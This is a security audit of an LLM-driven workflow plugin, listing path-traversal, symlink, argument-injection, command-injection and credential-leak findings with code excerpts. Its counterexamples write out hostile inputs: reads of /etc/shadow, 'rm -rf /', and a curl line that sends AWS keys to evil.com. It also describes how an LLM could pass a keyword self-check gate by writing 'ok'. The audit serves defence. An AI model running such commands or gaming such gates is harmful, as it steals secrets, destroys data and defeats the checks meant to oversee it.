# Security Audit — steering-flow plugin

**Auditor dimension**: SECURITY
**Spec**: `docs/execution-behavior.md`
**Source files reviewed**: `engine.ts`, `parser.ts`, `types.ts`, `index.ts`, `storage.ts`, `stop-guards.ts`, `builtin-registry.ts`, `builtins/*.mjs`
**Date**: 2026-04-23

---

## Finding S-01: Session ID path traversal — no sanitization on filesystem path construction

**Classification**: VULNERABLE

**Invariant violated**: Session directory must be confined to `.pi/steering-flow/<SESSION-ID>/` within the project tree.

**Location**: `storage.ts:26-28`

```ts
export function getSessionDir(cwd: string, sessionId: string): string {
    const safeId = sessionId && sessionId.length > 0 ? sessionId : "_no_session_";
    return resolve(cwd, ".pi", "steering-flow", safeId);
}
```

**Counterexample**: If `sessionId` is `"../../../../../../tmp/evil"`, then `resolve(cwd, ".pi", "steering-flow", "../../../../../../tmp/evil")` resolves to `/tmp/evil`. All subsequent writes (stack.json, fsm.json, tape.json, state.json) land outside the project tree.

**Trigger path**: `sessionId` comes from `ctx.sessionManager.getSessionId()` (index.ts:372,396,417,444,475,495). The plugin trusts the host to provide a safe value, but performs zero validation. If the session manager is compromised, misconfigured, or returns user-influenced data, the entire storage layer writes to attacker-controlled paths.

**Impact**: Arbitrary file write (via `atomicWriteJson`) to any path the process can access. Could overwrite `.bashrc`, `.ssh/authorized_keys`, or other sensitive files.

**Spec reference**: §E.4 specifies `newFsmId` = timestamp-slug-randomhex (safe), but says nothing about sessionId sanitization.

---

## Finding S-02: Flow file path traversal — `resolveFilePath` has no containment check

**Classification**: VULNERABLE

**Invariant violated**: Flow config loading should be confined to the project working directory or an explicitly trusted scope.

**Location**: `index.ts:100-102`

```ts
function resolveFilePath(cwd: string, p: string): string {
    return isAbsolute(p) ? p : resolve(cwd, p);
}
```

Called at `index.ts:120`:
```ts
const absPath = resolveFilePath(cwd, filePath);
```

**Counterexample**: LLM calls `load-steering-flow` with `filePath = "/etc/passwd"` or `filePath = "../../../../etc/shadow"`. Both resolve to absolute paths outside the project. The file is then `stat`'d, read (up to 2 MiB), and its content passed to `parseFlowConfig`. Even though parsing will likely fail, the error message at `index.ts:144-145` includes the parse error which may leak file content fragments.

**Trigger path**: The `load-steering-flow` tool (index.ts:~370) passes `params.file` directly to `loadAndPush` with no path containment check. The LLM controls `params.file`.

**Impact**: Arbitrary file read (up to 2 MiB) of any file readable by the process. Information disclosure via error messages.

---

## Finding S-03: Symlink following in `loadAndPush` — `fs.stat` instead of `fs.lstat`

**Classification**: VULNERABLE

**Invariant violated**: File type check should detect symlinks to prevent following them to arbitrary targets.

**Location**: `index.ts:123,127`

```ts
stat = await fs.stat(absPath);
// ...
if (!stat.isFile()) return { ok: false, error: `'${absPath}' is not a regular file` };
```

**Counterexample**: Attacker places a symlink at `flows/evil.yaml -> /etc/shadow` within the project directory. `fs.stat` follows the symlink, reports `isFile() === true`, and the target file is read. This bypasses any filename-based allowlisting.

**Impact**: Arbitrary file read via symlink indirection. Compounds with S-02 — even if S-02 were fixed with a containment check, symlinks within the allowed directory escape it.

---

## Finding S-04: LLM-controlled positional args flow unsanitized into child process argv

**Classification**: VULNERABLE

**Invariant violated**: Spec §F states spawn uses array form (no shell injection), but does not address argument injection within the argv array.

**Location**: `engine.ts:79-84`

```ts
const argv: string[] = [...configArgs, ...llmArgs];
// ...
child = spawn(cmd, argv, { cwd, env: process.env, detached: true, ... });
```

And `engine.ts:240-245`:
```ts
const namedArgs: Record<string, string> = {};
for (let i = 0; i < action.arguments.length; i++) {
    namedArgs[action.arguments[i]!.arg_name] = positionalArgs[i]!;
}
const condResult = await runCondition(action.condition, tapePath, positionalArgs, cwd, runtime.flow_dir, namedArgs);
```

**Counterexample**: A flow defines an action with `arg_name: "filename"` and condition `cmd: "git"`, `args: ["add", "${filename}"]`. The LLM provides `positionalArgs = ["--all"]`. The spawned command becomes `git add --all` — the LLM has injected a flag. More dangerously, with `cmd: "rm"`, `args: ["${target}"]`, the LLM could supply `"-rf"` followed by `"/"` if there are two args.

Additionally, `positionalArgs` are appended raw as `llmArgs` (engine.ts:79), so even without `${placeholder}` interpolation, LLM values appear directly in argv.

**Validation gap**: `executeAction` (engine.ts:229) only checks arg count, never arg content. No allowlist, no pattern validation, no `--` separator injection.

**Impact**: Argument injection into arbitrary condition commands. Severity depends on what commands flow authors configure, but the plugin provides zero defense.

---

## Finding S-05: `${arg-name}` interpolation injects LLM values into cmd path itself

**Classification**: VULNERABLE

**Invariant violated**: The command binary path should not be controllable by LLM-provided arguments.

**Location**: `engine.ts:75`

```ts
const cmd = resolveTokenRelToFlow(interpolatePlaceholders(rawCmd, tapePath, namedArgs), flowDir);
```

**Counterexample**: A flow author writes `cmd: "${tool}"` with an action argument `arg_name: "tool"`. The LLM provides `tool = "/usr/bin/curl"` (or any binary). The interpolation replaces `${tool}` in the cmd position, and `resolveTokenRelToFlow` passes absolute paths through unchanged. The plugin spawns an arbitrary binary chosen by the LLM.

**Impact**: Arbitrary command execution if any flow uses `${placeholder}` in the `cmd` field. The parser (parser.ts:228-238) validates cmd format but only on the raw YAML string — it cannot validate post-interpolation values.

---

## Finding S-06: Full `process.env` inherited by child processes

**Classification**: LEAK

**Invariant violated**: Principle of least privilege — child processes should not receive credentials they don't need.

**Location**: `engine.ts:87`

```ts
env: process.env,
```

**Counterexample**: The host process has `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `ANTHROPIC_API_KEY`, or database credentials in its environment. Every condition command — including LLM-influenced ones — inherits all of these. A malicious or compromised condition script can exfiltrate them.

**Impact**: Credential leakage to every spawned condition process. Combined with S-04/S-05, an LLM-influenced command could exfiltrate secrets via network (e.g., `curl https://evil.com/?key=$AWS_SECRET_ACCESS_KEY` if the LLM can influence cmd).

---

## Finding S-07: Symlink TOCTOU in `atomicWriteJson`

**Classification**: PARTIAL

**Invariant violated**: Atomic write should not follow symlinks at the target path.

**Location**: `storage.ts:37-42`

```ts
async function atomicWriteJson(path: string, data: unknown): Promise<void> {
    const tmp = `${path}.tmp.${process.pid}.${randomBytes(4).toString("hex")}`;
    const text = JSON.stringify(data, null, 2);
    await fs.writeFile(tmp, text, "utf-8");
    await fs.rename(tmp, path);
}
```

**Counterexample**: If the attacker creates a symlink at the `tmp` path between the `randomBytes` generation and `writeFile`, the write follows the symlink. The tmp filename includes 4 random bytes (32 bits of entropy) plus PID, making the tmp path hard to predict. On POSIX, `fs.rename` atomically replaces the name entry at `path`, so a symlink at the target is replaced (not followed).

**Impact**: Low probability arbitrary file write. The primary defense is the 32-bit random component in the tmp filename. No `O_EXCL` or `O_NOFOLLOW` flag is used.

---

## Finding S-08: `readStack` deserializes fsmId from disk without path-safety validation

**Classification**: VULNERABLE

**Invariant violated**: FSM IDs used in path construction must be path-safe.

**Location**: `storage.ts:87-92`

```ts
export async function readStack(sessionDir: string): Promise<string[]> {
    const p = join(sessionDir, "stack.json");
    const arr = await readJsonStrict<unknown>(p);
    if (arr === undefined) return [];
    if (!Array.isArray(arr)) throw new CorruptedStateError(p, "stack.json is not an array");
    return arr.filter((x) => typeof x === "string") as string[];
}
```

Then used at `storage.ts:126-128`:
```ts
export function fsmDir(sessionDir: string, fsmId: string): string {
    return join(sessionDir, fsmId);
}
```

**Counterexample**: If `stack.json` is tampered (e.g., by a prior path traversal via S-01, or by a condition script that writes to the session directory), it could contain `"../../etc"` as an fsmId. `fsmDir` joins this unsanitized, and `popFsm` (storage.ts:118) calls `fs.rm(fsmDir(...), { recursive: true, force: true })` — deleting `/etc` recursively.

**Note**: Under normal operation, `newFsmId` (storage.ts:270-274) generates safe IDs. The vulnerability requires stack.json tampering, which is reachable via S-01 or via a condition script that has write access to the session directory.

**Impact**: Arbitrary directory deletion via `popFsm` if stack.json is corrupted with a path-traversal fsmId.

---

## Finding S-09: `resolveTokenRelToFlow` has no containment check — path traversal via `../`

**Classification**: VULNERABLE

**Invariant violated**: Resolved paths should remain within the flow directory or a trusted scope.

**Location**: `engine.ts:20-26`

```ts
function resolveTokenRelToFlow(token: string, flowDir: string): string {
    if (!flowDir) return token;
    if (token.startsWith("./") || token.startsWith("../")) {
        return pathResolve(flowDir, token);
    }
    return token;
}
```

**Counterexample**: A YAML flow config specifies `cmd: "../../../usr/bin/curl"` or `args: ["../../../etc/passwd"]`. The parser (parser.ts:234-238) accepts `../`-prefixed paths as valid flow-relative paths. `resolveTokenRelToFlow` resolves them without checking containment. The resolved path escapes `flowDir`.

**Nuance**: This is authored by the flow config writer, not the LLM. If the flow author is trusted, this is by-design. But if flow configs can be loaded from untrusted sources (e.g., downloaded templates), this is exploitable.

**Impact**: Arbitrary file access or command execution via crafted flow configs with `../` traversal in cmd/args.

---

## Finding S-10: YAML parser type coercion — unexpected boolean/null injection

**Classification**: PARTIAL

**Invariant violated**: String fields in flow configs should remain strings after parsing.

**Location**: `parser.ts:553-556`

```ts
function parseScalar(s: string): unknown {
    if (s === "true") return true;
    if (s === "false") return false;
    if (s === "null" || s === "~") return null;
```

**Counterexample**: A YAML flow config has `action_desc: true`. The parser coerces this to boolean `true`. Downstream, `parser.ts:175` casts `a.action_desc as string` without a type check. The runtime carries a boolean where a string is expected.

**Mitigation**: The `validateCondition` function (parser.ts:228) explicitly checks `typeof c.cmd !== "string"`, and `condition.args` elements are individually type-checked (parser.ts:246). So cmd/args are guarded. But `action_desc`, `state_desc`, and `task_description` are cast without runtime type checks.

**Impact**: Type confusion in display-only fields. Low direct security impact, but could cause unexpected behavior if these values flow into template strings or error messages.

---

## Finding S-11: No limit on number of states, actions, or arguments per FSM

**Classification**: PARTIAL (DoS)

**Invariant violated**: Resource consumption should be bounded to prevent denial of service.

**Location**: `parser.ts:20-48` (parseFlowConfig) — only `MAX_FLOW_BYTES` (2 MiB) is enforced.

**Counterexample**: A 2 MiB YAML file with thousands of states, each with hundreds of actions, each with dozens of arguments. The BFS reachability checks (parser.ts:280-336) run in O(states x actions) time. The resulting FSM structure is serialized to `fsm.json` and held in memory.

**Existing mitigations**:
- 2 MiB byte limit on input (parser.ts:21)
- 64-level nesting depth limit (parser.ts:374)
- 64 KiB per tape value, 1024 tape keys (index.ts:42-43)
- 30s timeout per condition (engine.ts:6)
- 64 epsilon chain depth (engine.ts:5)

**Gap**: No cap on state count, action count per state, or argument count per action. A carefully crafted 2 MiB file could produce a combinatorial explosion in the BFS or in memory.

**Impact**: CPU/memory exhaustion during parsing. Bounded by the 2 MiB input limit, so practical impact is moderate.

---

## Finding S-12: `sweepTmpFiles` follows symlinks during deletion

**Classification**: PARTIAL

**Invariant violated**: Cleanup operations should not follow symlinks to delete files outside the session directory.

**Location**: `storage.ts:142-161`

```ts
export async function sweepTmpFiles(sessionDir: string): Promise<void> {
    // ...
    const entries = await fs.readdir(sessionDir, { withFileTypes: true });
    for (const e of entries) {
        if (e.isFile() && isOrphanTmp(e.name)) {
            await fs.rm(join(sessionDir, e.name), { force: true });
        } else if (e.isDirectory()) {
            // recurses into subdirectories
```

**Counterexample**: If an attacker can place a symlink named `something.tmp.99999.deadbeef` inside the session directory, `sweepTmpFiles` will `fs.rm` it. Since `fs.rm` on a symlink removes the symlink itself (not the target), the direct impact is limited.

**Impact**: Low. `fs.rm` without `recursive` on a symlink removes only the link. The real risk is if combined with S-01 (session dir pointing elsewhere).

---

## Finding S-13: `${$TAPE_FILE}` exposes absolute filesystem path to child processes

**Classification**: LEAK

**Invariant violated**: Internal filesystem layout should not be disclosed to potentially untrusted child processes.

**Location**: `engine.ts:43`

```ts
if (key === "$TAPE_FILE") return tapePath;
```

Where `tapePath` is the absolute path to `tape.json` (e.g., `/Users/alice/project/.pi/steering-flow/abc123/1234-flow-deadbeef/tape.json`).

**Counterexample**: Any condition command receives the absolute path to the tape file, revealing the username, project path, session ID, and FSM ID. A malicious condition script can use this to locate and read/write other files in the session directory.

**Impact**: Information disclosure of filesystem layout. Enables targeted attacks against other session files if combined with a compromised condition script.

---

## Finding S-14: Inline JSON normalization regex enables crafted object injection

**Classification**: PARTIAL

**Invariant violated**: YAML scalar parsing should not produce unexpected structured types from string-like input.

**Location**: `parser.ts:569-572`

```ts
if (s.startsWith("[") || s.startsWith("{")) {
    try { return JSON.parse(s); } catch { /* fall through */ }
    try {
        const normalized = s.replace(/([{,]\s*)([A-Za-z_][A-Za-z0-9_]*)\s*:/g, '$1"$2":');
        return JSON.parse(normalized);
    } catch { /* fall through */ }
}
```

**Counterexample**: A YAML value like `{__proto__: {isAdmin: true}}` would be normalized to `{"__proto__": {"isAdmin": true}}` and parsed by `JSON.parse`. However, `JSON.parse` does not trigger prototype pollution (it creates plain objects). The real risk is that a string-position value silently becomes a nested object.

**Mitigation**: `JSON.parse` is safe against prototype pollution. The downstream validators check types for `cmd` and `args`. But if this coercion occurs in an `action_desc` or `state_desc` field, the value becomes an object where a string is expected.

**Impact**: Low. Type confusion in non-security-critical fields. `JSON.parse` prevents prototype pollution.

---

## Finding S-15: Self-check-basic builtin is trivially bypassable

**Classification**: VULNERABLE (authorization bypass)

**Invariant violated**: Condition gates should provide meaningful enforcement of transition prerequisites.

**Location**: `builtins/self-check-basic.mjs:20-24`

```js
const keywords = ["done", "complete", "pass", "approved", "ok", "yes", "true", "satisfied"];
const lower = assessment.toLowerCase();
const passed = keywords.some((kw) => lower.includes(kw));
```

**Counterexample**: The LLM provides `"ok"` as its self-assessment. The gate passes regardless of whether the actual work meets the rubric. Any LLM that includes any of the 8 keywords in its response bypasses the check.

**Nuance**: The file documents itself as a "stub". However, if deployed as a transition guard in a production flow, it provides zero enforcement. An LLM can always include "ok" in its output.

**Impact**: Any flow using `self-check-basic` as a quality gate has no actual enforcement. The LLM controls both the assessment content and the pass/fail outcome.

---

## Summary Table

| ID | Finding | Classification | Severity |
|----|---------|---------------|----------|
| S-01 | Session ID path traversal | VULNERABLE | High |
| S-02 | Flow file path traversal via `resolveFilePath` | VULNERABLE | High |
| S-03 | Symlink following in `loadAndPush` (`stat` vs `lstat`) | VULNERABLE | Medium |
| S-04 | LLM args unsanitized in child process argv | VULNERABLE | High |
| S-05 | LLM values interpolated into cmd binary path | VULNERABLE | Critical |
| S-06 | Full `process.env` inherited by child processes | LEAK | Medium |
| S-07 | Symlink TOCTOU in `atomicWriteJson` | PARTIAL | Low |
| S-08 | Deserialized fsmId from disk used in paths unsanitized | VULNERABLE | High |
| S-09 | `resolveTokenRelToFlow` has no containment check | VULNERABLE | Medium |
| S-10 | YAML type coercion in non-validated fields | PARTIAL | Low |
| S-11 | No cap on state/action/argument counts (DoS) | PARTIAL | Medium |
| S-12 | `sweepTmpFiles` symlink interaction | PARTIAL | Low |
| S-13 | `${$TAPE_FILE}` leaks absolute filesystem path | LEAK | Low |
| S-14 | Inline JSON normalization produces unexpected objects | PARTIAL | Low |
| S-15 | `self-check-basic` trivially bypassable | VULNERABLE | Medium |

### Threat Model Notes

The plugin operates in a trust model where:
1. The **flow config author** is semi-trusted (writes YAML defining commands)
2. The **LLM** is untrusted (provides positional args, chooses actions)
3. The **session manager** is trusted (provides sessionId)
4. **Condition scripts** are semi-trusted (authored by flow writer, but receive LLM-influenced args)

The most critical findings (S-04, S-05) arise from the LLM's ability to influence child process execution through positional arguments and placeholder interpolation, with no content validation layer between the LLM and `spawn()`.
